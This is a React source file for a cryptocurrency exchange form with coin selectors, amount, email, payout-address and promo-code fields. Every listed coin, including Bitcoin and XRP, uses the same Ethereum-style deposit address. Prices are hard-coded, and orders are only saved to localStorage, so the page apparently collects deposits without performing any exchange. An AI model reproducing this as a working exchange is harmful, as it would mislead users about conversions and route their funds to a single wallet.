import { useState } from "react";
import { useForm } from "react-hook-form";
import error from "./assets/error.svg";
import "./Exchange.css";
import {
  bch,
  bnb,
  btc,
  eth,
  etc,
  ftm,
  ltc,
  sol,
  trx,
  usdt,
  xrp,
  zec,
  search,
} from "./assets";
import "./Exchange.css";
import { Navigate, redirect, useNavigate } from "react-router";

function App() {
  const options = [
    {
      price: 18349.21133,
      fullName: "Bitcoin",
      indexName: "BTC",
      icon: btc,
      adress: "0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73",
    },
    {
      price: 1405.43482,
      fullName: "Ethereum",
      indexName: "ETH",
      icon: eth,
      adress: "0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73",
    },
    {
      price: 278.16,
      fullName: "Binance Smart Chain",
      indexName: "BNB",
      icon: bnb,
      adress: "0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73",
    },
    {
      price: 107.21,
      fullName: "Bitcoin Cash",
      indexName: "BCH",
      icon: bch,
      adress: "0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73",
    },
    {
      price: 19.86,
      fullName: "Ethereum Classic",
      indexName: "ETC",
      icon: etc,
      adress: "0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73",
    },
    {
      price: 0.237085,
      fullName: "Fantom",
      indexName: "FTM",
      icon: ftm,
      adress: "0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73",
    },
    {
      price: 15.68,
      fullName: "Solana",
      indexName: "SOL",
      icon: sol,
      adress: "0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73",
    },
    {
      price: 81.76,
      fullName: "Litecoin",
      indexName: "LTC",
      icon: ltc,
      adress: "0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73",
    },
    {
      price: 0.055,
      fullName: "Tron",
      indexName: "TRX",
      icon: trx,
      adress: "0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73",
    },
    {
      price: 1,
      fullName: "Tether (ERC20)",
      indexName: "USDT",
      icon: usdt,
      adress: "0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73",
    },
    {
      price: 0.37,
      fullName: "Ripple",
      indexName: "XRP",
      icon: xrp,
      adress: "0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73",
    },
    {
      price: 43.737454,
      fullName: "Zcash",
      indexName: "ZEC",
      icon: zec,
      adress: "0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73",
    },
  ];

  function randomString(i) {
    var rnd = "";
    while (rnd.length < i) rnd += Math.random().toString(36).substring(2);
    return rnd.substring(0, i);
  }

  const findPrice = (e) => {
    return options.filter((i) => i.fullName === e.target.innerText);
  };

  const history = useNavigate();

  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
  } = useForm();
  const onSubmit = (data) => {
    const x = new Date();
    const date = x.getTime();
    const p = randomString(6);
    const adressTo = options.filter((i) => i.fullName === value)[0].adress;
    localStorage.setItem(
      "Order",
      JSON.stringify({
        ...data,
        value,
        secondValue,
        price,
        secondPrice,
        exchangeAmount,
        date,
        p,
        adressTo,
      })
    );
    history("/orders");
  };

  const [value, setValue] = useState("Bitcoin");
  const [firstIcon, setFirstIcon] = useState(options[0].icon);
  const [isActiveFirst, setIsActiveFirst] = useState(false);
  const [exchangeAmount, setExchangeAmount] = useState(0);
  const [secondValue, setSecondValue] = useState("Ethereum");
  const [price, setPrice] = useState(18349.21133);
  const [MinValue, setMinValue] = useState(1);
  const [secondPrice, setSecondPrice] = useState(1405.43482);
  const [secondIcon, setSecondIcon] = useState(options[1].icon);
  const [isActiveSecond, setIsActiveSecond] = useState(false);

  return (
    <div
      className="container font-poppins pt-[50px] sm:mb-[30px]"
      id="exchange"
    >
      <div className="exchange-panel">
        <h1 className="sell__title text-white text-[30px]">
          Sell {value} for {secondValue}
        </h1>
        <form onSubmit={handleSubmit(onSubmit)} className="flex__box">
          <div className="relative container__select">
            <div className="full-width">
              <div
                className="select__box relative z-index pointer"
                onClick={() => setIsActiveFirst((prev) => !prev)}
              >
                <span className="select__title">
                  <img src={firstIcon} alt="" />
                  {value}
                </span>
                <span className="select__search">
                  <img src={search} alt="search" />
                  Search
                </span>
              </div>
            </div>
            <div
              className={`absolute selection block ${
                isActiveFirst ? "active" : ""
              }`}
            >
              {isActiveFirst &&
                options.map((i) => (
                  <div
                    key={i.fullName + "second"}
                    id={`${i.price}`}
                    onClick={(e) => {
                      setIsActiveFirst(false);
                      setValue(e.target.textContent);
                      const price = findPrice(e);
                      setFirstIcon(price[0].icon);
                      setPrice(price[0].price);
                      setMinValue((prev) => {
                        if (price[0].price * exchangeAmount < 50) {
                          return 50;
                        } else {
                          return 0;
                        }
                      });
                    }}
                    className="pointer selection__item"
                  >
                    <img src={i.icon} alt="" />
                    {i.fullName}
                  </div>
                ))}
            </div>
          </div>
          <div className="relative container__select">
            <div className="full-width">
              <div
                className="select__box relative z-index pointer"
                onClick={() => setIsActiveSecond((prev) => !prev)}
              >
                <span className="select__title">
                  <img src={secondIcon} alt="" />
                  {secondValue}
                </span>
                <span className="select__search">
                  <img src={search} alt="search" />
                  Search
                </span>
              </div>
            </div>
            <div
              className={`absolute selection block ${
                isActiveSecond ? "active" : ""
              }`}
            >
              {isActiveSecond &&
                options.map((i) => (
                  <div
                    key={i.fullName + "second"}
                    id={`${i.price}`}
                    onClick={(e) => {
                      setIsActiveSecond(false);
                      setSecondValue(e.target.textContent);
                      const price = findPrice(e);
                      setSecondIcon(price[0].icon);
                      setSecondPrice(price[0].price);
                    }}
                    className="pointer selection__item"
                  >
                    <img src={i.icon} alt="" />
                    {i.fullName}
                  </div>
                ))}
            </div>
          </div>
          {/* as;doisad;sa;dnas 
          sadads
          asdasd
          sa
          dsa
          d
          asd
          a*/}
          <div className="first__exchange">
            <label
              htmlFor="input__exchange1"
              className="label__input text-white"
            >
              You Send
            </label>
            <input
              type="text"
              {...register("Amount", {
                required: "The field is required",
                min: {
                  value: MinValue,
                  message: "Minimal amount not reached",
                },
                pattern: {
                  value: /^[0-9]*\.?[0-9]*$/i,
                  message: "Invalid number",
                },
                onChange: (e) => {
                  setExchangeAmount(e.target.value);
                  setMinValue((prev) => {
                    const findPrice = options.filter(
                      (i) => i.fullName !== value
                    );

                    if (findPrice[0].price * exchangeAmount < 50) {
                      return 50;
                    } else {
                      return 0;
                    }
                  });
                },
              })}
              className="exchange__input"
              id="input__exchange1"
              placeholder="12.213"
            />
            {errors.Amount ? (
              <div className="error-div">
                <span className="flex items-center gap-[7px]">
                  <img src={error} alt="error" />
                  {errors?.Amount && (
                    <p>{errors?.Amount?.message || "Error"}</p>
                  )}
                </span>
              </div>
            ) : (
              ""
            )}
          </div>
          <div className="first__exchange">
            <label
              htmlFor="input__exchange2"
              className="label__input text-white"
            >
              You Get
            </label>
            <h4
              id="input__exchange2"
              type="text"
              className="exchange__input read-only"
              placeholder="12.213"
            >
              {Math.ceil(((exchangeAmount * price) / secondPrice) * 1000000) /
                1000000}
            </h4>
          </div>
          <div className="first__exchange">
            <label
              htmlFor="input__exchange3"
              className="label__input text-white"
            >
              Your Email
            </label>
            <input
              type="text"
              {...register("Email", {
                required: "The field is required",
                minLength: {
                  value: 4,
                  message: "Email is not long enough",
                },
                pattern: {
                  value: /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i,
                  message: "Invalid email address",
                },
              })}
              className="exchange__input"
              id="input__exchange1"
              placeholder="hoobank@support.com"
            />
            {errors.Email ? (
              <div className="error-div">
                <span className="flex items-center gap-[7px]">
                  <img src={error} alt="error" />
                  {errors?.Email && <p>{errors?.Email?.message || "Error"}</p>}
                </span>
              </div>
            ) : (
              ""
            )}
          </div>
          <div className="first__exchange">
            <label
              htmlFor="input__exchange4"
              className="label__input text-white"
            >
              Enter {secondValue} Adress
            </label>
            <input
              type="text"
              {...register("Adress", {
                required: "The field is required",
                pattern: {
                  value:
                    /^0x[A-Za-z0-9]+$|bc[A-Za-z0-9]+$|eth[A-Za-z0-9]+$|bnb[A-Za-z0-9]+$|zec[A-Za-z0-9]+$|bch[A-Za-z0-9]+$|zec[A-Za-z0-9]+$|etc[A-Za-z0-9]+$|TR[A-Za-z0-9]+$/i,
                  message: "Invalid adress",
                },
                minLength: {
                  value: 15,
                  message: "Invalid adress",
                },
              })}
              className="exchange__input"
              id="input__exchange1"
              placeholder="0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73"
            />
            {errors.Adress ? (
              <div className="error-div">
                <span className="flex items-center gap-[7px]">
                  <img src={error} alt="error" />
                  {errors?.Adress && (
                    <p>{errors?.Adress?.message || "Error"}</p>
                  )}
                </span>
              </div>
            ) : (
              ""
            )}
          </div>
          <div className="first__exchange">
            <label
              htmlFor="input__exchange5"
              className="label__input text-white"
            >
              Promocode
            </label>
            <input
              placeholder={`A43JSM12`}
              // value={promo}
              {...register("Promocode", {
                maxLength: {
                  value: 6,
                  message: "Promocode is not valid",
                },
                minLength: {
                  value: 6,
                  message: "Promocode is not valid",
                },
              })}
              // onChange={(e) => setPromo(e.target.value)}
              className="exchange__input"
              id="input__exchange5"
            />
            {errors.Promocode ? (
              <div className="error-div">
                <span className="flex items-center gap-[7px]">
                  <img src={error} alt="error" />
                  {errors?.Promocode && (
                    <p>{errors?.Promocode?.message || "Error"}</p>
                  )}
                </span>
              </div>
            ) : (
              ""
            )}
          </div>
          <div className="submit__shelf">
            <button className="submit__btn pointer relative z-8">
              Proceed to payment
            </button>
            <span className="span__rules">
              By clicking the button, you agree to the{" "}
              <a href="/rules" className="rules__link">
                Rules
              </a>
            </span>
          </div>
        </form>
      </div>
    </div>
  );
}

export default App;
